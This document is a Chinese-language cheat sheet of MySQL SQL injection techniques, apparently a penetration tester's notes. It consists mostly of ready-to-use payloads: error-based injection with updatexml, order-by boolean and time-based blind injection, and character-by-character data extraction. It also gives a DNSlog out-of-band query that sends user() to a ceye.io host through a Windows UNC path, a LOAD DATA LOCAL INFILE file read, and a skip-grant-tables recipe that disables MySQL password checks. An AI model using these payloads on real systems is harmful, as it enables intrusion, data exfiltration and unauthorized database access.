报错注入拼接字符时返回正常页面的问题

问题：有时使用xpath报错拼接字符串时会返回正常页面
原因：
从原理出发，可能是使用concat拼接时有数据为null，导致整个拼接字符为null,这又符合xpath_string语法，所以页面正常，只是xpath没匹配到结果
解决：
使用concat_ws替代，忽略所有null值
语法实例：concat_ws(';',user,pass,tel)

dnslog外带注入（windows下）

# @@secure_file_priv 变量不为null
select load_file(concat('\\\\',(select user()),'.xxxx.ceye.io\xxxx'))

# 为什么Windows可用，Linux不行？
# 这里涉及到一个叫UNC的知识点。简单的说，在Windows中，路径以`\\`开头的路径在Windows中被定义为UNC路径，相当于网络硬盘一样的存在，所以我们填写域名的话，Windows会先进行DNS查询。但是对于Linux来说，并没有这一标准，所以DNSLOG在Linux环境不适用。注：payload里的四个`\\\\`中的两个`\`是用来进行转义处理的。

order by注入
判断注入类型-rand

#数字型order by注入时,语句order by=2 and 1=2,和order by=2 and 1=1 显示的结果一样,所以无法用来判断注入点类型，而rand()在数字型中，每次刷新会显示不同的排序结果，当在字符型中用?sort=rand(),则不会有效果,排序不会改变，因此用rand()可判断注入点类型
select * from users order by rand()

结合if盲注

# 数字型
?order=if(表达式,2,3)

# 知道列名
?order=if(表达式,id,username)

# 不知道列名，表达式为false时，sql语句会报ERROR 1242 (21000): Subquery returns more than 1 row的错误，导致查询内容为空
order=if(表达式,1,(select id from information_schema.tables))

结合时间盲注

order by if(表达式,1,sleep(1))

结合报错

order by updatexml(1,if(1=2,1,(表达式)),1)

字符串截取函数

# left(a,b)从左侧截取a的前b位
left(database(),1)>'s'

# substr(a,b,c)从b位置开始，截取字符串a的c长度。ascii()将某个字符转换为ascii值
ascii(substr((select database()),1,1))=98

# mid(a,b,c)从位置b开始，截取a字符串的c位，ord()函数同ascii()，将字符转为ascii值
ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))>98

# regexp正则注入，user()结果为root，regexp为匹配root的正则表达式
# 参考链接：https://www.cnblogs.com/lcamry/articles/5717442.html
select user() regexp '^[a-z]';
select user() regexp '^ro'

字符串连接函数

# 没有分隔符地连接字符串，其中一个str为null，最终拼接结果为null
concat(str1,str2,...)

# 含有分隔符地连接字符串，可以忽略null值
concat_ws(separator,str1,str2,...)

where特性

# 参考逻辑漏洞：https://www.leavesongs.com/PENETRATION/findpwd-funny-logic-vul.html
# code这个字段的类型是整型int(11)。而在mysql里面，当字段类型为整型，而where语句中的值不为整型的时候，会被转换成整型才放入查询。也就是说，如果where code='xxx'，xxx不为整型的话，则会先将xxx转换成整数，才放入查询。也就是说，如果我们传入的字符串为0aaa，则会转换成0，再执行。

# 得到的结果都是1。
select count(*) from `user` where `id`='0a';
select count(*) from `user` where `id`='0';

CREATE TABLE mysql.m1 (code TEXT );
LOAD DATA LOCAL INFILE 'D://1.txt' INTO TABLE mysql.m1 fields terminated by '\n';
select * from mysql.m1;

取消密码校验

参考：https://blog.csdn.net/qq_40732354/article/details/99633971

步骤：
1.修改mysql配置文件，linux默认/etc/my.cnf
2.在文件中的 [mysqld] 下添加 skip-grant-tables = 1
3.重启mysql服务 systemctl restart mysqld
4.连接mysql，密码已置为空
